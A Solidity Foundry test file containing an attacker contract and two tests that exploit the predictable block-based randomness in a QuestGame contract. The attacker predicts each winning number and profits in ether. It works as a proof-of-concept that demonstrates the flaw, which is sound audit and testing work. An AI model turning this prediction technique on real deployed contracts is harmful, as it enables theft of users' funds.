
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract AttackerContract {
    QuestGame public target;
    
    constructor(QuestGame _target) {
        target = _target;
    }
    
    function attack() external payable {
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    address(this)
                )
            )
        );
        uint256 predictedNumber = seed % 100;
        
        target.attemptQuest{value: 0.1 ether}(predictedNumber);
    }
    
    receive() external payable {}
}

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public _contractUnderTest;
    AttackerContract public attacker;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        _contractUnderTest = new QuestGame{value: 5 ether}();
        attacker = new AttackerContract(_contractUnderTest);
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        vm.assume(blockTimestamp >= block.timestamp);
        vm.assume(blockTimestamp < type(uint256).max - 1 hours);
        vm.assume(blockNumber >= block.number);
        vm.assume(blockNumber < type(uint256).max - 1000);

        vm.deal(address(attacker), 1 ether);
        vm.deal(address(_contractUnderTest), 5 ether);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    address(attacker)
                )
            )
        );
        uint256 expectedNumber = seed % 100;

        uint256 attackerBalanceBefore = address(attacker).balance;
        
        vm.recordLogs();
        attacker.attack();
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        
        bool foundEvent = false;
        bool questSucceeded = false;
        uint256 generatedNumber = 0;
        
        for (uint256 i = 0; i < entries.length; i++) {
            if (entries[i].topics[0] == keccak256("QuestAttempted(address,bool,uint256)")) {
                foundEvent = true;
                (questSucceeded, generatedNumber) = abi.decode(entries[i].data, (bool, uint256));
                break;
            }
        }
        
        assertTrue(foundEvent, "QuestAttempted event should be emitted");
        assertEq(generatedNumber, expectedNumber, "Generated number should match predicted value");
        assertTrue(questSucceeded, "Quest should succeed with predicted number");
        
        uint256 attackerBalanceAfter = address(attacker).balance;
        assertEq(
            attackerBalanceAfter, 
            attackerBalanceBefore - 0.1 ether + 0.2 ether, 
            "Attacker should profit from exploiting weak randomness"
        );
        
        (uint256 exp, uint256 wins) = _contractUnderTest.getPlayerStats(address(attacker));
        assertEq(exp, 100, "Attacker should gain experience");
        assertEq(wins, 1, "Attacker should have 1 win");
    }

    function test_directExploitDemonstration() public {
        address exploiter = address(0x1234);
        vm.deal(exploiter, 1 ether);
        
        uint256 targetTimestamp = block.timestamp + 100;
        uint256 targetBlock = block.number + 10;
        
        vm.warp(targetTimestamp);
        vm.roll(targetBlock);
        
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    exploiter
                )
            )
        );
        uint256 predictedNumber = seed % 100;
        
        uint256 balanceBefore = exploiter.balance;
        
        vm.prank(exploiter);
        _contractUnderTest.attemptQuest{value: 0.1 ether}(predictedNumber);
        
        uint256 balanceAfter = exploiter.balance;
        
        assertEq(balanceAfter, balanceBefore + 0.1 ether, "Exploiter should profit 0.1 ether");
        
        (uint256 exp, uint256 wins) = _contractUnderTest.getPlayerStats(exploiter);
        assertEq(exp, 100, "Exploiter should gain 100 experience");
        assertEq(wins, 1, "Exploiter should have 1 win");
    }

    receive() external payable {}
}
